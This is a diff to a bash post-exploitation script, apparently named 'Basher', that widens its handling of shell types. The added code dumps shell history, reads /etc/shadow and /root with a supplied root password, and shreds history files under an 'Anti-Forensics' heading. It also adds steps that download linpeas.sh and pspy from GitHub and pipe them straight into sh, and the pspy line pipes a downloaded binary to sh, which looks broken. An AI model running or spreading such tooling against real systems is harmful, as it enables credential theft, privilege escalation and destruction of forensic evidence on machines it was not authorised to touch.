@@ -42,9 +42,25 @@ if [ "$SHELL" == "/usr/bin/zsh" ]; then
 
     cat ~/.zsh_history
 
-else
+elif [ "$SHELL" == "/usr/bin/ash" ]; then
 
-    cat ~/.bash_history
+	cat ~/.ash_history
+
+elif [ "$SHELL" == "/usr/bin/fish" ]; then
+
+	cat ~/.config/fish/fish_history
+
+elif [ "$SHELL" == "/usr/bin/ksh" ]; then
+
+	cat ~/.ksh_history
+
+elif [ "$SHELL" == "/usr/bin/bash" ]; then
+    
+	cat ~/.bash_history
+
+else 
+
+	echo "Unrecognized shell: $SHELL"
 
 fi
 
@@ -126,12 +142,14 @@ if [ "$answer" == "y" ]; then
 
 	echo "OPENING SHADOW FILE"
 	echo "$rootpw" | sudo -S cat /etc/shadow
+
 	echo "-----------------------------------------"
+
 	echo "LISTING /ROOT CONTENTS"
 	echo "$rootpw" | sudo -S ls /root
 
 else
-	echo "Find a way to Root!"
+	echo "Find a way to Root! Use Lynis or Peass!"
 
 fi
 
@@ -194,12 +212,21 @@ read response
 if [ "$response" == "y" ]; then
 
 	echo "Beginning Anti-Forensics"
+	
 	if [ "$SHELL" == "/usr/bin/zsh" ]; then
 		shred -u ~/.zsh_history
 
-	else
+	elif [ "$SHELL" == "/usr/bin/ash" ]; then
 
-		shred -u ~/.bash_history
+		shred -u ~/.ash_history
+
+	elif [ "$SHELL" == "/usr/bin/fish" ]; then
+
+		shred -u ~/.config/fish/fish_history
+
+	elif [ "$SHELL" == "/usr/bin/ksh" ]; then
+
+		shred -u ~/.ksh_history
 
 	fi
 
@@ -210,5 +237,35 @@ else
 fi
 
 echo "-----------------------------------------"
+
+echo "Do you wish to run Linpeass? [y / n]"
+
+read answer
+
+if [ $answer == "y" ]; then
+
+	curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+else 
+
+	echo "Moving on" 
+
+fi
+
+echo "-----------------------------------------"
+
+echo "Do you want to monitor the system with pspy? [y / n]"
+
+read answer
+
+if [ $answer == "y" ]; then
+
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s | sh
+
+else
+
+	echo
+
+fi
 
 echo "Thanks for Using Basher!"
